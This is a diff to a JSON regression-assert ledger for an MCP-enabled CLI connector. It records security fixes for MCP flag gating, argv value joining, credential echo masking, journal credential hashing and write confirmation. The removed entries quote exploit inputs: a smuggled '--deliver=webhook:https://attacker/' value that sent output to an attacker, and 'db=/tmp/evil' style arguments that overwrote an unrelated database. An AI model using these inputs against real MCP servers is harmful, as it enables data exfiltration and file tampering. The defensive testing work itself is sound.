@@ -142,7 +142,7 @@
      "contains": "func doctorProbeCredentials("
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorBaseURLIsPlaceholder("
     },
     {
@@ -164,6 +164,36 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorProbeCredentials(cmd.Context(), c, cmd.Root(),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -207,348 +237,605 @@
    ]
   },
   {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
+   "id": "journal-credential-hardening",
+   "class": "secret-persisted",
    "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
+   "summary": "The learn journal, teach log and run profiles keep no credential a user typed: the LEARN_SESSION override is stored hashed, the argv shape keeps only names the invoked command declares (a placeholder otherwise, stopping at \"--\"), a failed flag is an opaque identity, and teach.log records argument counts, never raw arguments. Refusing operator text that repeats a held credential is the shared credential kit's job at every file and SQLite sink (credkit-wiring), so the connector-side RefuseHeld calls are gone.",
+   "why": "Press 4.34.0 and 4.34.2 (learn/journal.go.tmpl) return the override raw from JournalSessionKey, so a credential set there is written to journal-*.jsonl on every command, version included, and record every typed flag name, so a credential typed as a flag name (or after --) becomes an argv_shape key and the failed_flag; teach.log records the raw arguments of a teach with no --query; and a credential given as a profile name or description, a recall or teach query or operand, or feedback is stored as typed. Known limits: a guessable override or typed name can be confirmed by hashing guesses; entries an older build wrote stay until the 14-day retention deletes their segment; operator-named text that repeats no credential the process holds is a name and is kept. A reprint that drops these edits fails these asserts and TestJournalCredentialHardening; re-run tools/maintainer/apply_journal_hardening.py --slug <slug>.",
+   "spec_encode_followup": "Press-side: learn/journal.go.tmpl should hash the LEARN_SESSION override as it hashes harness ids, and JournalArgvShape should take the invoked command's declared-flag lookup and record any other name as a placeholder, stopping at \"--\"; the failed flag should be an opaque identity; teach.log should not echo raw arguments; and every template that stores operator-named text should refuse one that repeats a held credential.",
    "asserts": [
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\t\treturn \"o:\" + hashHarnessSession(v)\n\t}",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "const journalUndeclaredFlag = \"<undeclared>\"",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func JournalArgvShape(args []string, isBoolFlag, isDeclared func(name string) bool) map[string]string {",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\t\tif tok == \"--\" {\n\t\t\tbreak\n\t\t}\n\t\tif !strings.HasPrefix(tok, \"-\") || tok == \"-\" {\n\t\t\tcontinue\n\t\t}",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\t\tif isDeclared == nil || !isDeclared(name) {\n\t\t\tshape[journalUndeclaredFlag] = journalClassRedacted\n\t\t\tcontinue\n\t\t}\n\t\tswitch {",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say this build's remote path is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    }
-   ]
-  },
-  {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path). The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "secret-echo-decoded-funnel",
-   "class": "secret-echo",
-   "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown). Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.",
-   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.",
-   "asserts": [
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelEchoes(text string, secrets []string) bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelRecognizesEveryEncodingOfAHeldSecret(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "held = append(held, value)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "c.maskCredentialText(truncateBody(respBody), authHeader)"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(truncateBody(body))"
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "var funnelSteps = []func(string) []string{",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "funnelTextStep(funnelIdentityUnescape),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelHeld(text string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelCodexRound2(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli.go",
-     "contains": "func funnelCommandErrors(root *cobra.Command) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli_test.go",
-     "contains": "func TestFunnelCommandErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\tif entry.FailedFlag != \"\" && entry.SuggestedFlag != \"\" {\n\t\tentry.FailedFlag = \"--\" + journalUndeclaredFlag + \":\" + hashHarnessSession(entry.FailedFlag)\n\t} else {\n\t\tentry.FailedFlag = \"\"\n\t}",
      "code_only": true
     },
     {
      "file": "cli/internal/cli/root.go",
-     "contains": "funnelCommandErrors(rootCmd)",
-     "min_count": 1,
+     "contains": "\tlookupFlag := func(name string) *pflag.Flag {\n\t\tf := target.Flags().Lookup(name)\n\t\tif f == nil {\n\t\t\tf = target.InheritedFlags().Lookup(name)\n\t\t}\n\t\tif f == nil && len(name) == 1 {\n\t\t\tf = target.Flags().ShorthandLookup(name)\n\t\t}\n\t\treturn f\n\t}\n\tisBoolFlag := func(name string) bool {\n\t\tf := lookupFlag(name)\n\t\treturn f != nil && f.Value.Type() == \"bool\"\n\t}",
      "code_only": true
     },
     {
-     "file": "cli/cmd/rewst-mcp/main.go",
-     "contains": "server.WithToolHandlerMiddleware(funnelToolErrors),",
-     "min_count": 1,
+     "file": "cli/internal/cli/root.go",
+     "contains": "\tisDeclaredFlag := func(name string) bool {\n\t\tf := lookupFlag(name)\n\t\treturn f != nil && (f.Name == name || f.Shorthand == name)\n\t}\n\tlearn.JournalInvocation(learn.JournalEntry{",
      "code_only": true
     },
     {
-     "file": "cli/cmd/rewst-mcp/secret_funnel_mcp.go",
-     "contains": "func funnelToolErrors(next server.ToolHandlerFunc) server.ToolHandlerFunc {",
-     "min_count": 1,
+     "file": "cli/internal/cli/root.go",
+     "contains": "\t\tCmd:           journalVerbChain(rootCmd, executed),\n\t\tArgvShape:     learn.JournalArgvShape(os.Args[1:], isBoolFlag, isDeclaredFlag),",
      "code_only": true
     },
     {
-     "file": "cli/cmd/rewst-mcp/secret_funnel_mcp_test.go",
-     "contains": "func TestFunnelToolErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/cli/teach.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"teach: missing --query (%d args, %d resources)\", len(args), len(resources)))",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "c.holdCredentials()",
-     "min_count": 1,
+     "file": "cli/internal/cli/teach_playbook.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"playbook amend: missing --query (%d args)\", len(args)))",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.FunnelHold(authHeader)",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func hashHarnessSession(v string) string {\n\tsum := sha256.Sum256([]byte(v))\n\treturn hex.EncodeToString(sum[:8])\n}",
      "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "not_contains": "journalSessionEnvVar)); v != \"\" {\n\t\treturn v\n"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag)"
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalCredentialHardening(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalHardeningStartupOverride(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalFailedFlagIdentity(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "no-response-cache",
+   "class": "secret-echo",
+   "summary": "The on-disk response cache is off on every client: raw Domotz bodies never sit in cache files.",
+   "why": "Work order: nothing but the credential store holds a credential. c.NoCache = true in guardClient (domotz_guard.go); TestGuardWrapsTheSessionTransport asserts it. README and SKILL say responses are never cached (tools/apply_docfixes.py). Ported to domotz from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the abnormal 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the betterstack 4.34.2 reprint (one credential layer across the fleet). Ported to knowbe4 from the domotz 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (domotz names, commands and seen/ logs of that run dir); the asserts carry the knowbe4 names. Ported to pandadoc from the knowbe4 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (knowbe4 or domotz names, commands and seen/ logs of those run dirs); the asserts carry the pandadoc names. Ported to rewst from the pandadoc 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (pandadoc, knowbe4 or domotz names, commands and seen/ logs of those run dirs); the asserts carry the rewst names.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/rewst_guard.go",
+     "contains": "c.NoCache = true",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-mirror-write-confirm",
+   "class": "write-safety",
+   "summary": "No MCP tool changes Domotz state: every endpoint tool is a GET marked read-only and every mirrored command is read-only or writes only the CLI's own files. The confirm gate stays installed so a mirrored command a later print adds that is neither read-only nor local previews and sends only with confirm: true.",
+   "why": "Work order: an MCP write previews and sends only with confirm: true. RequireConfirmForMirroredWrites (hand file internal/mcp/cobratree/domotz_confirm.go), called from RegisterTools after RegisterAll. TestRegisteredMirroredWritesNeedConfirm fails on any registered tool that is not read-only, not on its local list and has no confirm gate; TestMCPSendsOnlyReads (black-box) checks a full MCP battery sends only GETs and the two logins. Ported to domotz from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the abnormal 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the betterstack 4.34.2 reprint (one credential layer across the fleet). Ported to knowbe4 from the domotz 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (domotz names, commands and seen/ logs of that run dir); the asserts carry the knowbe4 names. Ported to pandadoc from the knowbe4 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (knowbe4 or domotz names, commands and seen/ logs of those run dirs); the asserts carry the pandadoc names. Ported to rewst from the pandadoc 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (pandadoc, knowbe4 or domotz names, commands and seen/ logs of those run dirs); the asserts carry the rewst names.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "cobratree.RequireConfirmForMirroredWrites(s, cli.RootCmd(), cobratree.CachedSiblingCLIPath)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/rewst_confirm.go",
+     "contains": "func RequireConfirmForMirroredWrites(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/rewst_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/rewstblackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReadsWithoutConfirm(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "docs-credential-safety",
+   "class": "docs",
+   "summary": "README and SKILL carry a Credential safety section (which host gets which credential, withheld output, 0600 store, dry run, MCP confirm) and no longer promise a five-minute response cache (the cache is off on every client).",
+   "why": "The generated docs describe the press defaults (a response cache) that the credential layer turns off; a reprint restores the false promise and drops the transcripts reasoning the work order requires. Ported to domotz from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the abnormal 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the betterstack 4.34.2 reprint (one credential layer across the fleet). Ported to knowbe4 from the domotz 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (domotz names, commands and seen/ logs of that run dir); the asserts carry the knowbe4 names. Ported to pandadoc from the knowbe4 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (knowbe4 or domotz names, commands and seen/ logs of those run dirs); the asserts carry the pandadoc names. Ported to rewst from the pandadoc 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (pandadoc, knowbe4 or domotz names, commands and seen/ logs of those run dirs); the asserts carry the rewst names.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "README.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "README.md",
+     "not_contains": "cached for five minutes"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "cached for five minutes"
+    }
+   ]
+  },
